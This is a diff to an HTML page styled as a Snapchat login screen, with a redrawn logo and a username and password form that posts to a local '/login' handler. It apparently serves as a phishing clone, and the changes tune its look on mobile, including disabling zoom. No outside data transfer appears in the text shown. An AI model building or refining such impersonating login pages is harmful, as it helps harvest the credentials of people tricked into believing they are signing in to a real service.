@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Snapchat - Log In</title>
     <style>
         * {
@@ -18,12 +18,13 @@
             align-items: center;
             min-height: 100vh;
             color: #333;
+            padding: 20px;
         }
         .container {
             background: #fff;
-            padding: 40px 32px;
+            padding: 40px 32px 32px;
             width: 100%;
-            max-width: 420px;
+            max-width: 400px;
         }
         .logo {
             text-align: center;
@@ -34,21 +35,26 @@
             height: auto;
         }
         .form-group {
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
         .form-group input {
             width: 100%;
-            padding: 16px;
+            padding: 16px 14px;
             background: #f7f7f7;
             border: 1px solid #e6e6e6;
             border-radius: 12px;
             font-size: 16px;
-            transition: border-color 0.3s;
+            outline: none;
+            transition: border-color 0.3s, background 0.3s;
+            -webkit-appearance: none;
         }
         .form-group input:focus {
-            outline: none;
             border-color: #fffc00;
             background: #fff;
+        }
+        .form-group input::placeholder {
+            color: #999;
+            font-size: 15px;
         }
         .login-btn {
             width: 100%;
@@ -58,48 +64,57 @@
             border-radius: 12px;
             color: #000;
             font-size: 18px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: background 0.3s, opacity 0.2s;
             margin-top: 8px;
+            touch-action: manipulation;
+        }
+        .login-btn:active {
+            opacity: 0.8;
         }
         .login-btn:hover {
             background: #e6e300;
         }
         .divider {
             text-align: center;
-            margin: 20px 0;
+            margin: 20px 0 16px;
             color: #999;
-            font-size: 14px;
+            font-size: 13px;
+            position: relative;
         }
         .divider::before,
         .divider::after {
             content: '';
-            display: inline-block;
+            position: absolute;
+            top: 50%;
             width: 35%;
             height: 1px;
             background: #e6e6e6;
-            vertical-align: middle;
         }
+        .divider::before { left: 0; }
+        .divider::after { right: 0; }
         .divider span {
+            background: #fff;
             padding: 0 12px;
-            vertical-align: middle;
+            position: relative;
+            z-index: 1;
         }
         .links {
             text-align: center;
             font-size: 14px;
-            margin-top: 16px;
+            margin-top: 12px;
         }
         .links a {
             color: #333;
             text-decoration: none;
-            margin: 0 8px;
+            margin: 0 6px;
         }
         .links a:hover {
             text-decoration: underline;
         }
         .signup-text {
-            margin-top: 24px;
+            margin-top: 22px;
             text-align: center;
             font-size: 16px;
             color: #666;
@@ -112,19 +127,30 @@
         .signup-text a:hover {
             text-decoration: underline;
         }
-        .error-msg {
-            color: #d6202e;
-            font-size: 14px;
-            text-align: center;
-            margin-top: 10px;
-            display: none;
-        }
         @media (max-width: 480px) {
             .container {
-                padding: 20px 16px;
+                padding: 20px 16px 20px;
             }
             .logo svg {
-                width: 150px;
+                width: 160px;
+            }
+            .form-group input {
+                padding: 14px 12px;
+                font-size: 15px;
+                border-radius: 10px;
+            }
+            .login-btn {
+                padding: 14px;
+                font-size: 16px;
+                border-radius: 10px;
+            }
+        }
+        @media (max-width: 380px) {
+            .logo svg {
+                width: 130px;
+            }
+            .container {
+                padding: 15px 12px;
             }
         }
     </style>
@@ -134,17 +160,17 @@
         <div class="logo">
             <svg viewBox="0 0 250 60" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <rect x="0" y="5" width="60" height="50" rx="12" fill="#fffc00" stroke="#000" stroke-width="2"/>
-                <text x="75" y="42" font-family="-apple-system, BlinkMacSystemFont, sans-serif" font-size="32" font-weight="700" fill="#000">Snapchat</text>
+                <text x="72" y="42" font-family="-apple-system, BlinkMacSystemFont, sans-serif" font-size="34" font-weight="700" fill="#000">Snapchat</text>
                 <circle cx="30" cy="30" r="10" fill="#000"/>
                 <circle cx="30" cy="30" r="5" fill="#fffc00"/>
             </svg>
         </div>
-        <form id="loginForm" method="POST" action="/login">
+        <form id="loginForm" method="POST" action="/login" autocomplete="off">
             <div class="form-group">
-                <input type="text" name="username" placeholder="Username or Email" required>
+                <input type="text" name="username" placeholder="Username or Email" required autocomplete="username">
             </div>
             <div class="form-group">
-                <input type="password" name="password" placeholder="Password" required>
+                <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
             </div>
             <button type="submit" class="login-btn">Log In</button>
             <div class="divider"><span>or</span></div>
@@ -163,6 +189,7 @@
             const btn = this.querySelector('.login-btn');
             btn.textContent = 'Logging in...';
             btn.disabled = true;
+            btn.style.opacity = '0.7';
         });
     </script>
 </body>
